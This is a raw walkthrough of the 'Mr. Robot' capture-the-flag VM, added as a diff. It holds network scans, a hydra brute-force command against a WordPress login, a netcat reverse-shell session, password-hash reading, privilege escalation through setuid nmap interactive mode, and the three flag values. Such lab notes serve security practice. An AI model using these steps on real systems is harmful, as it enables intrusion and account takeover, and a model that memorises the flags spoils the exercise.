@@ -1,0 +1,194 @@
+kali :  192.168.31.102
+mr. robot : 192.168.31.178 
+
+sudo -s
+netdiscover
+
+ Currently scanning: 192.168.0.0/16   |   Screen View: Unique Hosts                                                                                                
+                                                                                                                                                                   
+ 5 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 300                                   
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.31.1    b8:3b:ab:bf:40:30      3     180  Arcadyan Corporation                            
+ 192.168.31.159  e0:2b:e9:1c:89:2d      1      60  Intel Corporate                                 
+ 192.168.31.178  08:00:27:69:47:64      1      60  PCS Systemtechnik GmbH                          
+
+
+check open ports
+
+──(root㉿kali)-[/home/kali]
+└─# nmap -sV -A -Pn 192.168.31.178
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 22:47 IST
+Nmap scan report for linux.lan (192.168.31.178)
+Host is up (0.00095s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+MAC Address: 08:00:27:69:47:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.14 (94%), Amazon Fire TV (93%), Linux 3.2 - 3.8 (93%), Linux 3.13 - 4.4 (93%), Linux 3.18 (93%), Linux 3.13 or 4.2 (92%), Linux 4.4 (92%), Linux 2.6.32 - 3.13 (91%), Synology DiskStation Manager 7.1 (Linux 4.4) (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.95 ms linux.lan (192.168.31.178)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.35 seconds
++
+
+
+use nikto 
+┌──(root㉿kali)-[/home/kali]
+└─# nikto -h 192.168.31.178       
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.31.178
++ Target Hostname:    192.168.31.178
++ Target Port:        80
++ Start Time:         2025-10-23 22:50:40 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /jqivQuW2.dbc: Retrieved x-powered-by header: PHP/5.5.29.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /index: Uncommon header 'tcn' found, with contents: list.
++ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
++ /admin/: This might be interesting.
++ /readme: This might be interesting.
++ /image/: Drupal Link header found with value: <http://192.168.31.178/?p=23>; rel=shortlink. See: https://www.drupal.org/
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ /license.txt: License file found may identify site software.
++ /admin/index.html: Admin login page/section found.
++ /wp-login/: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /wp-login/: Admin login page/section found.
++ /wp-login.php: Wordpress login found.
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 8102 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2025-10-23 22:54:01 (GMT5.5) (201 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+                                                                                                                                                                       
+┌──(root㉿kali)-[/home/kali]
+└─# hydra  -L '/home/kali/PASSS.txt'  -P'/home/kali/PASSS.txt'  192.168.31.178 http-post-form 'wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=invailid'
+Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-16 11:40:16
+[ERROR] optional parameter must start with a '/' slash!
+
+  
+                                                                                                             
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 1234        
+listening on [any] 1234 ...
+connect to [192.168.1.7] from (UNKNOWN) [192.168.1.26] 38188
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 06:18:24 up 33 min,  0 users,  load average: 0.02, 0.04, 0.08
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ LS
+/bin/sh: 1: LS: not found
+$ ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+$ cd home
+$ ls
+robot
+$ cd robot
+$ ls
+key-2-of-3.txt
+password.raw-md5
+$ cat key-2-of-3.txt      
+cat: key-2-of-3.txt: Permission denied
+$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+daemon@linux:/home/robot$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:~$ which nmap
+which nmap
+/usr/local/bin/nmap
+robot@linux:~$ export TERM=xterm
+export TERM=xterm
+robot@linux:~$ nmap -interactive
+nmap -interactive
+Failed to open input file nteractive for reading
+QUITTING!
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sudo /bin/bash
+!sudo /bin/bash
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+robot is not in the sudoers file.  This incident will be reported.
+waiting to reap child : No child processes
+nmap> !id
+!id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+waiting to reap child : No child processes
+nmap> !sh
+!sh
+# whoami
+whoami
+root
+# ls
+ls
+key-2-of-3.txt  password.raw-md5
+# cd /root
+cd /root
+# ls
+ls
+firstboot_done  key-3-of-3.txt
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+
+04787ddef27c3dee1ee161b21670b4e4
+# 
+
+
+
+
+flag 1: 073403c8a58a1f80d943455fb30724b9
+flag 2: 822c73956184f694993bede3eb39f959
+flag 3: 04787ddef27c3dee1ee161b21670b4e4
